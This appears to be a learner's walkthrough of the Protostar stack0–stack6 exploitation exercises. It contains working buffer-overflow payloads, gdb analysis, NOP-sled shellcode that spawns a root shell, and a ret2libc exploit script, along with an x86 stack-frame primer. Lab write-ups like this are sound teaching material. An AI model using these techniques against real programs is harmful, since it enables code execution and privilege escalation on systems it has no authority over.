# Prostar Answers:
## Stack0
python -c "print 64*'@'+ '123'" | ./stack0

## Stack1
./stack1 $(python -c "print 64*'@'+ '\x64\x63\x62\x61'")

## Answer stack2:
 export GREENIE=$(python -c "print 64*'@'+ '\x0a\x0d\x0a\x0d'")
user@protostar:/opt/protostar/bin$ ./stack2
you have correctly modified the variable!!!!

## Answer stack3:
gdb ./stack3
	(gdb) x win
	0x8048424 <win>:	0x83e58955
	
0x8048424 -> \x24\x84\x04\x08 (litle endian)

user@protostar:/opt/protostar/bin$ python -c "print 64*'@'+ '\x24\x84\x04\x08'" | ./stack3
calling function pointer, jumping to 0x08048424
code flow successfully changed

## Answer stack4
gdb ./stack4
	(gdb) x win
	0x80483f4 <win>:	0x83e58955
0x80483f4 -> \xf4\x83\x04\x08
```bash
user@protostar:/opt/protostar/bin$ python -c 'print "A"*76 + "\xf4\x83\x04\x08"' | ./stack4
code flow successfully changed
Segmentation fault
```

Lets crack it this time.


### Recon

Lets run it and see what happens.

```bash
user@protostar:/opt/protostar/bin$ ./stack4
ABCD
user@protostar:/opt/protostar/bin$
```
Nothing much happens!

### Static Analysis

1. Strings
```bash
user@protostar:/opt/protostar/bin$ strings stack4
/lib/ld-linux.so.2
__gmon_start__
libc.so.6
_IO_stdin_used
gets
puts
__libc_start_main
GLIBC_2.0
PTRh 
[^_]
code flow successfully changed

```
We see a potentially useful string `code flow successfully changed` straight away. 

2. Bootup GDB

```bash
user@protostar:/opt/protostar/bin$ gdb stack4 

...

(gdb) set disassembly-flavor intel
(gdb) disassemble main
Dump of assembler code for function main:
0x08048408 <main+0>:	push   ebp
0x08048409 <main+1>:	mov    ebp,esp
0x0804840b <main+3>:	and    esp,0xfffffff0
0x0804840e <main+6>:	sub    esp,0x50
0x08048411 <main+9>:	lea    eax,[esp+0x10]
0x08048415 <main+13>:	mov    DWORD PTR [esp],eax
0x08048418 <main+16>:	call   0x804830c <gets@plt>
0x0804841d <main+21>:	leave  
0x0804841e <main+22>:	ret    
End of assembler dump.
(gdb) 

```

No way `code flow successfully changed` is stored in main as there is only a call to `gets()` seen in `main()` there’s no `print()/puts()` call in here. Question is where the fu*k is our string?
	- Inference: String being printed from somewhere else.
	- To find:  we’ve to first the address where this string is located and then search for reference to it.

Lets keep digging :)

3. Finding address where this string is located.
- Now lets get the section addresses (Using `maintenance info sections` gdb command)
- Search for the string’s address in `.rodata` section (using `find <section_start_address> <section_end_address> <string>` gdb command)
- Search for a reference to the string’s address in `.text` section (using `find <section_start_address> <section_end_address> <string_address>` gdb command)

```bash
(gdb) maintenance info sections 
Exec file:
    `/opt/protostar/bin/stack4', file type elf32-i386.
    0x8048114->0x8048127 at 0x00000114: .interp ALLOC LOAD READONLY DATA HAS_CONTENTS
    0x8048128->0x8048148 at 0x00000128: .note.ABI-tag ALLOC LOAD READONLY DATA HAS_CONTENTS
    0x8048148->0x804816c at 0x00000148: .note.gnu.build-id ALLOC LOAD READONLY DATA HAS_CONTENTS
    0x804816c->0x8048198 at 0x0000016c: .hash ALLOC LOAD READONLY DATA HAS_CONTENTS
    0x8048198->0x80481b8 at 0x00000198: .gnu.hash ALLOC LOAD READONLY DATA HAS_CONTENTS
    0x80481b8->0x8048218 at 0x000001b8: .dynsym ALLOC LOAD READONLY DATA HAS_CONTENTS
    0x8048218->0x8048267 at 0x00000218: .dynstr ALLOC LOAD READONLY DATA HAS_CONTENTS
    0x8048268->0x8048274 at 0x00000268: .gnu.version ALLOC LOAD READONLY DATA HAS_CONTENTS
    0x8048274->0x8048294 at 0x00000274: .gnu.version_r ALLOC LOAD READONLY DATA HAS_CONTENTS
    0x8048294->0x804829c at 0x00000294: .rel.dyn ALLOC LOAD READONLY DATA HAS_CONTENTS
    0x804829c->0x80482bc at 0x0000029c: .rel.plt ALLOC LOAD READONLY DATA HAS_CO---Type <return> to continue, or q <return> to quit---
NTENTS
    0x80482bc->0x80482ec at 0x000002bc: .init ALLOC LOAD READONLY CODE HAS_CONTENTS
    0x80482ec->0x804833c at 0x000002ec: .plt ALLOC LOAD READONLY CODE HAS_CONTENTS
    0x8048340->0x80484bc at 0x00000340: .text ALLOC LOAD READONLY CODE HAS_CONTENTS
    0x80484bc->0x80484d8 at 0x000004bc: .fini ALLOC LOAD READONLY CODE HAS_CONTENTS
    0x80484d8->0x80484ff at 0x000004d8: .rodata ALLOC LOAD READONLY DATA HAS_CONTENTS
    0x8048500->0x8048504 at 0x00000500: .eh_frame ALLOC LOAD READONLY DATA HAS_CONTENTS
    0x8049504->0x804950c at 0x00000504: .ctors ALLOC LOAD DATA HAS_CONTENTS
    0x804950c->0x8049514 at 0x0000050c: .dtors ALLOC LOAD DATA HAS_CONTENTS
    0x8049514->0x8049518 at 0x00000514: .jcr ALLOC LOAD DATA HAS_CONTENTS
    0x8049518->0x80495e8 at 0x00000518: .dynamic ALLOC LOAD DATA HAS_CONTENTS
    0x80495e8->0x80495ec at 0x000005e8: .got ALLOC LOAD DATA HAS_CONTENTS
    0x80495ec->0x8049608 at 0x000005ec: .got.plt ALLOC LOAD DATA HAS_CONTENTS
    0x8049608->0x8049610 at 0x00000608: .data ALLOC LOAD DATA HAS_CONTENTS
    0x8049610->0x8049618 at 0x00000610: .bss ALLOC
    0x0000->0x0ad4 at 0x00000610: .stab READONLY HAS_CONTENTS
    0x0000->0x3bd2 at 0x000010e4: .stabstr READONLY HAS_CONTENTS
---Type <return> to continue, or q <return> to quit---
    0x0000->0x0039 at 0x00004cb6: .comment READONLY HAS_CONTENTS
(gdb) find 0x80484d8,0x80484fe,"code flow successfully changed" # decrease the right limit by 1
	0x80484e0
	1 pattern found.
(gdb) find 0x8048340,0x80484bb,0x80484e0
	0x80483fd <win+9>
	1 pattern found.
```
Huraaaaayy!!!!!!! We figured out where our string was getting called. So whats next? 

4. Disassemble win
Lets disassemble win function and get a little idea of how <win> works and *this will also give us its address*

```bash
(gdb) disassemble win 
	Dump of assembler code for function win:
	0x080483f4 <win+0>:	push   ebp
	0x080483f5 <win+1>:	mov    ebp,esp
	0x080483f7 <win+3>:	sub    esp,0x18
	0x080483fa <win+6>:	mov    DWORD PTR [esp],0x80484e0
	0x08048401 <win+13>:	call   0x804832c <puts@plt>
	0x08048406 <win+18>:	leave  
	0x08048407 <win+19>:	ret    
	End of assembler dump.

```


#### Inference from static Analysis
- we need to **make our program start executing at** `0x80483f4` (Entry point of function win) somehow.


### Dynamic Analysis
Armed with our static analysis so far, we start our dynamic analysis. So, fire up gdb.
```bash
(gdb) disassemble main
Dump of assembler code for function main:
0x08048408 <main+0>:	push   ebp ## break here 1
0x08048409 <main+1>:	mov    ebp,esp
0x0804840b <main+3>:	and    esp,0xfffffff0
0x0804840e <main+6>:	sub    esp,0x50
0x08048411 <main+9>:	lea    eax,[esp+0x10] ## break here 2
0x08048415 <main+13>:	mov    DWORD PTR [esp],eax
0x08048418 <main+16>:	call   0x804830c <gets@plt> ## break here 3
0x0804841d <main+21>:	leave  ## break here 4
0x0804841e <main+22>:	ret    ## break here 5
End of assembler dump.

```

We set breakpoints at few locations like below:
```bash
(gdb) b *0x08048408
Breakpoint 1 at 0x8048408: file stack4/stack4.c, line 12.
(gdb) b *0x08048411
Breakpoint 2 at 0x8048411: file stack4/stack4.c, line 15.
(gdb) b *0x08048418
Breakpoint 3 at 0x8048418: file stack4/stack4.c, line 15.
(gdb) b *0x0804841d
Breakpoint 4 at 0x804841d: file stack4/stack4.c, line 16.
(gdb) b *0x0804841e
Breakpoint 5 at 0x804841e: file stack4/stack4.c, line 16.

```

Now, we run the program till the first couple of breakpoints and analyze the registers/stack.

Run till break point 2 and check `x/24x $esp` & `x/4x $ebp`

```bash
(gdb) r
Starting program: /opt/protostar/bin/stack4 

Breakpoint 1, main (argc=1, argv=0xbffff854) at stack4/stack4.c:12
12	stack4/stack4.c: No such file or directory.
	in stack4/stack4.c
(gdb) info r
eax            0xbffff854	-1073743788
ecx            0xc762baa1	-949831007
edx            0x1	1
ebx            0xb7fd7ff4	-1208123404
esp            0xbffff7ac	0xbffff7ac
ebp            0xbffff828	0xbffff828
esi            0x0	0
edi            0x0	0
eip            0x8048408	0x8048408 <main>
eflags         0x200246	[ PF ZF IF ID ]
cs             0x73	115
ss             0x7b	123
ds             0x7b	123
es             0x7b	123
fs             0x0	0
gs             0x33	51


(gdb) c
Continuing.

Breakpoint 2, main (argc=1, argv=0xbffff854) at stack4/stack4.c:15
15	in stack4/stack4.c
(gdb) info r
eax            0xbffff854	-1073743788
ecx            0xc762baa1	-949831007
edx            0x1	1
ebx            0xb7fd7ff4	-1208123404
esp            0xbffff750	0xbffff750
ebp            0xbffff7a8	0xbffff7a8
esi            0x0	0
edi            0x0	0
eip            0x8048411	0x8048411 <main+9>
eflags         0x200286	[ PF SF IF ID ]
cs             0x73	115
ss             0x7b	123
ds             0x7b	123
es             0x7b	123
fs             0x0	0
gs             0x33	51

(gdb) x/24x $esp
0xbffff750:	0xb7fd7ff4	0xb7ec6165	0xbffff768	0xb7eada75
0xbffff760:	0xb7fd7ff4	0x080495ec	0xbffff778	0x080482e8
0xbffff770:	0xb7ff1040	0x080495ec	0xbffff7a8	0x08048449
0xbffff780:	0xb7fd8304	0xb7fd7ff4	0x08048430	0xbffff7a8
0xbffff790:	0xb7ec6365	0xb7ff1040	0x0804843b	0xb7fd7ff4
0xbffff7a0:	0x08048430	0x00000000	0xbffff828	0xb7eadc76

(gdb) x/4x $ebp
0xbffff7a8:	0xbffff828	0xb7eadc76	0x00000001	0xbffff854

```

Inference: 
   - The base pointer (`ebp`) as `0xbffff828` and this is preserved at `0xbffff7a8`.
   - Main updates the current stack pointer (`esp`) as the new `ebp` of main.
   - esp=0xbffff750 (Current stack top)
   - ebp=0xbffff7a8 (Current base pointer) 
   - Main’s calling function’s(win) `ebp` is `0xbffff828` and preserved at `0xbffff7a8`
   - Main’s calling function’s(win) return address is saved one word before the ebp (as we know as part of the call instruction of calling program). Thus return address is `0xb7eadc76` as we can see at location `0xbffff7ac` (previous_ebp + 0x4 = `0xbffff7a8` + 0x4). This address `0xbffff7ac` is the one that we want to overwrite with our intended address of win function so as to execute that instead of main’s caller function.

Now, run till the next breakpoint.

```bash
(gdb) c
Continuing.

Breakpoint 3, 0x08048418 in main (argc=1, argv=0xbffff854)
    at stack4/stack4.c:15
15	in stack4/stack4.c
(gdb) x $esp
0xbffff750:	0xbffff760
```
- the pointer address for storing the input string from gets is located at 0xbffff760 (since the argument to gets is the buffer address and it is passed at the top of the stack as we know from previous section). 
```txt
address_to_override - current_stack_address = number_of_bits_to_override 
0xbffff7ac - 0xbffff760 = 0x4C (76 bytes)
```
we know that the difference between our intended location and *input buffer address is 76 bytes*, so if we input 80 bytes, **the 77th-80th bytes will overwrite the return address**. 

```bash
(gdb) c
	Continuing.
	12345678901234567890123456789012345678901234567890123456789012345678901234567890

	Breakpoint 4, main (argc=0, argv=0xbffff854) at stack4/stack4.c:16
	16	in stack4/stack4.c
(gdb) x/24x $esp
	0xbffff750:	0xbffff760	0xb7ec6165	0xbffff768	0xb7eada75
	0xbffff760:	0x34333231	0x38373635	0x32313039	0x36353433
	0xbffff770:	0x30393837	0x34333231	0x38373635	0x32313039
	0xbffff780:	0x36353433	0x30393837	0x34333231	0x38373635
	0xbffff790:	0x32313039	0x36353433	0x30393837	0x34333231
	0xbffff7a0:	0x38373635	0x32313039	0x36353433	0x30393837
(gdb) info r $ebp
	ebp            0xbffff7a8	0xbffff7a8


(gdb) c
	Continuing.

	Breakpoint 5, 0x0804841e in main (argc=Cannot access memory at address 0x3635343b
	) at stack4/stack4.c:16
	16	in stack4/stack4.c



(gdb) info r $ebp
ebp            0x36353433	0x36353433 ## As u see its over written
```

We continue and enter an `80 byte` long pattern and can see the repeated pattern visible on the stack and the last `4 bytes` `7890` (`0x30393837` in little endian hex format) have overwritten the address. We also see that if we stop after the leave instruction, the value `0x36353433` from address `0xbffff7a8` has been popped back into ebp.


> Now, we find out the address of the win function and use its address as the last 4 bytes in an 80 byte input to the program to crack it.


```bash
(gdb) x win
0x80483f4 <win>:	0x83e58955

```



Answer
```bash
user@protostar:/opt/protostar/bin$ python -c 'print "A"*76 + "\xf4\x83\x04\x08"' | ./stack4
code flow successfully changed
Segmentation fault
```









#### Primer about X86 stack frames
- Stack Frames: a region on the stack - purticular to a single function being executed in the call flow - represents its execution environment
  - ie machaaaa, if `win()` function is getting executed in the call flow, the region on the stack representing `win()`, is called stack frame of `win()` -> it represents the execution env of `win()` function
**if the same function is called many times, each instance of calling that function will have its own stack frame on the stack.**
- Stack Frame consist of 
   1. Parameters passed to the function
   2. Return address (Code location to jump to after the function is complete)
   3. Pointer to the previous (Calling function’s) stack frame’s base.
   4. Local variables
Let’s see with the help of a small example how this works. 

```c
int foo(int a)
{
  int x = 2;
  int y = 3;
  x = a + x;
  return x;
}

int main()
{
  int a = 0;
  int b = 1;
  foo(a);
}
```
This will compile to the following assembly code.
```asm
foo:
	push   ebp
	mov    ebp,esp
	sub    esp,0x10
	mov    DWORD PTR [ebp-0x8],0x2
	mov    DWORD PTR [ebp-0x4],0x3
	mov    eax,DWORD PTR [ebp+0x8]
	add    DWORD PTR [ebp-0x8],eax
	mov    eax,DWORD PTR [ebp-0x8]
	leave
	ret

main:
	push   ebp
	mov    ebp,esp
	sub    esp,0x14
	mov    DWORD PTR [ebp-0x8],0x0
	mov    DWORD PTR [ebp-0x4],0x1
	mov    eax,DWORD PTR [ebp-0x8]
	mov    DWORD PTR [esp],eax
	call   0x80483ed <foo>
	leave
	ret

```

#### Important registers (x86 registers)
- esp: Stack Pointer. Points to (Holds address of) the current top of the stack
- ebp: Base Pointer. Points to (Holds address of) the base/start of the current stack frame
- eip: Instruction Pointer. Points to (Holds address of) the next instruction to be executed in the program

#### Calling Convention / Function Parameters
- the **parameters being passed to a function and the return address are pushed onto the stack before calling it**. 
- This can be seen in the below instruction.
```asm
mov    DWORD PTR [esp],eax ## this one
call   0x80483ed <foo>
```
- The call instruction is equivalent of pushing `eip + 2`(return back address) onto the stack(refer image) and then jumping to the called function’s address(foo). `eip + 2` here points to the address of the instruction that should be executed next after returning from the called function.

#### Function Prologue / Entry Sequence
- At the very beginning of a function, the first work done is to **save the calling function’s(main()) base pointer (ebp) onto the stack** and 
- **then move the current function’s(foo()) base pointer to point towards calling function’s(main()) top**. This can be seen in these instructions:
```asm
foo:
push   ebp ## This line right here :0
mov    ebp,esp

```

#### Local Variables
Then, space is created on the stack for holding any local variables.
```asm
sub    esp,0x10
```

#### Exit Sequence
Finally, after the function has executed, **it returns by restoring the calling function’s(main()) base pointer and then popping the next value (return address)(eip + 2 which was saved before) from stack into the eip.**
```asm
leave
ret
```

> Here, leave is equivalent of `pop ebp` to restore `ebp` value. 
> `ret` is equivalent of `pop eip` to start executing the next instruction after the function call.

### What we need to do
   -  Program flow is controlled through `eip` register
   - On returning from a called function, `eip` register is updated with a value (return address) from the stack
   - If we can somehow **overflow a local variable on stack to modify the return address accurately, we can control the program execution**.
   - Note that similar to the function foo, even **the function main has its own stack frame and returns back to “something” after completing its execution**. This “something” is the c library runtime against which the compiler linked the program. So we can even **try to change execution path by modifying this return address.**
   
   

#### Points to remember
-  Various sections of executable file.
 - __`.text`: the executable portion__
 - __`.rodata`: literal strings (initialised read-only data)__
 - `.data`:  initialised data
 - `.bss`: uninitialized data.
 - `.plt`: PLT (Procedure Linkage Table) (IAT equivalent).
 - `.got`: GOT entries dedicated to dynamically linked global variables.
 - `.got.plt`: GOT entries dedicated to dynamically linked functions.
 - `.dynamic`: Holds all needed information for dynamic linking.
 - `.dynsym`: symbol tables dedicated to dynamically linked symbols.
 - `.strtab`: string table of `.symtab` section.


## Answer stack5

```bash
user@protostar:/opt/protostar/bin$ python -c "import sys;sys.stdout.write('\x90' * 76 + '\x00\xf8\xff\xbf'+ '\x90'*30 +'\x31\xc0\x31\xdb\xb0\x06\xcd\x80\x53\x68/tty\x68/dev\x89\xe3\x31\xc9\x66\xb9\x12\x27\xb0\x05\xcd\x80\x31\xc0\x50\x68//sh\x68/bin\x89\xe3\x50\x53\x89\xe1\x99\xb0\x0b\xcd\x80');" | ./stack5
# whoami
root


```



shellcraft onliner payload
```txt
\x31\xc0\x31\xdb\xb0\x06\xcd\x80\x53\x68/tty\x68/dev\x89\xe3\x31\xc9\x66\xb9\x12\x27\xb0\x05\xcd\x80\x31\xc0\x50\x68//sh\x68/bin\x89\xe3\x50\x53\x89\xe1\x99\xb0\x0b\xcd\x80
```


Reset instruction pointer to the start of main then add our payload shell code and run it.

```bash
(gdb) break main
Breakpoint 1 at 0x80483cd: file stack5/stack5.c, line 10.
(gdb) r
Starting program: /opt/protostar/bin/stack5 

Breakpoint 1, main (argc=1, argv=0xbffff854) at stack5/stack5.c:10
10	stack5/stack5.c: No such file or directory.
	in stack5/stack5.c
(gdb) x $esp
0xbffff750:	0xb7fd7ff4
(gdb) p $esp
$1 = (void *) 0xbffff750

```
0xbffff750 -> \x50\xf7\xff\xbf

 **overwrite EIP with 0xbffff750, put the shellcode at the end**
 *running a program in gdb changes the stack a little, so our address might be off by a few hundred.* 
 - option1 :So either we can keep trying this with a bunch of different addresses until it works (which is definitely possible if you run a loop), 
 - option2: or we can extend our margin for error by using no-operations (NOPs)
   - **NOPs are just single characters (\x90) which tell the computer to skip past them to the next command.** -> This means if we write a bunch of them to memory (a NOP sled) and then write the shellcode after them, we can run the code by hitting any one of the NOPS. 
   **76 * buffer+ eip_overridden_address + 30*NOPS + shellcode_payload**
```bash
      With GDB                          Shellcode (without GDB)
\   \   \   \   \   \ 
\      buffer       \ <- 0xbffff750 ->  \   \   \   \   \   \
\       EIP         \                   \   filled buffer   \
\    other stuff    \                   \  overwritten EIP  \
\    GDB stuff      \ <- 0xbffff800 ->  \  NOPS & shellcode \
\   \   \   \   \   \                   \   \   \   \   \   \
```   
   
   
   
```bash
user@protostar:/opt/protostar/bin$ python -c "import sys;sys.stdout.write('\x90' * 76 + '\x50\xf7\xff\xbf'+ '\x90'*30 +'\x31\xc0\x31\xdb\xb0\x06\xcd\x80\x53\x68/tty\x68/dev\x89\xe3\x31\xc9\x66\xb9\x12\x27\xb0\x05\xcd\x80\x31\xc0\x50\x68//sh\x68/bin\x89\xe3\x50\x53\x89\xe1\x99\xb0\x0b\xcd\x80');" | ./stack5
Segmentation fault

```
Well gdb isn’t that far out, so we try shifting down the stack (up in address) until we get a hit, we can use jumps of up to 30 bytes as this is the length of our NOP sled.
loop this until no segmentation error: 
**76 * buffer+ eip_overridden_address+30 + 30*NOPS + shellcode_payload**

in the end you will get `bffff800`
```bash
user@protostar:/opt/protostar/bin$ python -c "import sys;sys.stdout.write('\x90' * 76 + '\x00\xf8\xff\xbf'+ '\x90'*30 +'\x31\xc0\x31\xdb\xb0\x06\xcd\x80\x53\x68/tty\x68/dev\x89\xe3\x31\xc9\x66\xb9\x12\x27\xb0\x05\xcd\x80\x31\xc0\x50\x68//sh\x68/bin\x89\xe3\x50\x53\x89\xe1\x99\xb0\x0b\xcd\x80');" | ./stack5
# whoami
root


```
\x00\xf8\xff\xbf
bffff800
bffff750

## Answer Stack 6

Normal ways wont work here. We need to make our own shellcode to break this.
exploit struct6.py
```py
#!/usr/bin/python
import struct

### EIP Offset
padding = "A" * 80
## padding+= "BBBBCCCCDD" 

### libc system
system = struct.pack("I", 0xb7ecffb0)

### Return Address After system
ret = "\x90" * 4

### libc /bin/sh 
shell = struct.pack("I", 0xb7e97000 + 0x11f3bf)
print padding + system + ret + shell
```


output

```bash
user@protostar:/tmp$ (python stack6.py;cat)| /opt/protostar/bin/stack6
input path please: got path AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA���AAAAAAAAAAAA��췐����c��
whoami
root

```
[Reference:Exploit Exercise | Protostar | Stack 6](https://medium.com/bugbountywriteup/expdev-exploit-exercise-protostar-stack-6-ef75472ec7c6)


## References: Thank you Guys :)  

- [Reference: Exploit-Exercises Protostar Stack 5](https://medium.com/@coturnix97/exploit-exercises-protostar-stack-5-963731ff4b71)
- [Reference: Practical Reverse Engineering Tutorials Part 2: Protostar Stack4](https://shantanugoel.com/2017/12/04/practical-reverse-engineering-tutorial-2-protostar-stack4/)
- [References:Exploit Exercise](https://exploit-exercises.lains.space/protostar/stack4/)
- [Reference: Executable and Linkable Format 101 - Part 1 Sections and Segments](https://www.intezer.com/blog/research/executable-linkable-format-101-part1-sections-segments/)
- [Reference:Hex Calculator](https://www.calculator.net/hex-calculator.html?number1=bffff7ac&c2op=-&number2=bffff760&calctype=op&x=52&y=13)
- [Reference:GDB find command error “warning: Unable to access x bytes of target memory at y, halting search”](https://stackoverflow.com/questions/34819167/gdb-find-command-error-warning-unable-to-access-x-bytes-of-target-memory-at-y)

